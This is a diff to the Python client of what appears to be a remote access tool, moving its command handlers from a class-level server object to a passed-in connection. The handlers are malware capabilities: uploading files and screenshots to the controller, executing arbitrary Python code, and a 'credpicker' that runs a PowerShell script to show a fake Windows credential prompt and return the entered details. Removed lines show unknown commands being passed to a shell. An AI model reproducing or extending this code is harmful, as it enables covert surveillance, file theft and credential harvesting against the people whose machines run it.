@@ -116,35 +116,20 @@ def get_command_list():
     return json.dumps([cmd for cmd in vars(Command) if hasattr(getattr(Command, cmd), 'help')])
 
 
-def execute_command(command):
-    cmd_name, cmd_arg = parse(command)
-    if hasattr(Command, cmd_name):
-        func = getattr(Command, cmd_name)
-        if not len(inspect.getfullargspec(func).args):
-            result = func()
-        else:
-            result = func(cmd_arg)
-        if result:
-            return result[0], result[1] + '\n'
-    else:
-        return Command.shell(command)
-
-
 class Command:
-    server = None
-    id = None
 
     @staticmethod
     @desc('close connection')
-    def kill():
-        Command.server.close()
+    def kill(_instance):
+        _, conn = _instance
+        conn.close()
         sys.exit(0)
 
     @staticmethod
     @desc('reset connection')
-    def reset():
+    def reset(_instance):
         subprocess.Popen(EXECUTABLE_PATH)
-        Command.server.close()
+        _instance[1].close()
         sys.exit(0)
 
     @staticmethod
@@ -187,9 +172,10 @@ class Command:
 
     @staticmethod
     @desc('download file')
-    def download(filename):
+    def download(filename, _instance):
         if os.path.isfile(filename):
-            Command.server.send_file(Command.id, filename)
+            id, conn = _instance
+            conn.send_file(id, filename)
         else:
             return 0, 'File does not exist'
 
@@ -203,21 +189,22 @@ class Command:
 
     @staticmethod
     @desc('execute python code')
-    def pyexec(code, args=None):
-        if args is None:
-            args = {}
+    def pyexec(code, kwargs=None):
+        if kwargs is None:
+            kwargs = {}
         f = io.StringIO()
         with contextlib.redirect_stdout(f), contextlib.redirect_stderr(f):
-            exec(code, args)
+            exec(code, kwargs)
         return 1, f.getvalue()
 
     @staticmethod
     @desc('grab a screenshot')
-    def screenshot():
+    def screenshot(_instance):
         import pyautogui
         filename = 'screenshot_{}.png'.format(get_time())
         pyautogui.screenshot(filename)
-        Command.server.send_file(filename, id=Command.id)
+        id, conn = _instance
+        conn.send_file(id, filename)
         os.remove(filename)
 
     @staticmethod
@@ -511,7 +498,6 @@ ShortSvcName="flcVPN"
 
         @desc('Windows.Security.Credentials.UI.CredentialPicker')
         def credpicker():
-            server = Command.server
             filename = os.path.abspath(r'external\Cred.ps1')
             if not os.path.isfile(filename):
                 return 0, f'File does not exist: {filename}'
@@ -519,10 +505,9 @@ ShortSvcName="flcVPN"
                                  stderr=subprocess.PIPE, shell=True)
             stdout, stderr = p.communicate()
             if stderr:
-                server.send_result(0, stderr.decode(locale.getdefaultlocale()[1]), id=Command.id, eof=1)
-                return
+                return 0, stderr.decode(locale.getdefaultlocale()[1])
             lines = stdout.decode(locale.getdefaultlocale()[1]).splitlines()
-            server.send_result(1, str(lines), id=Command.id, eof=1)
+            return 1, str(lines)
 
         return locals()
 
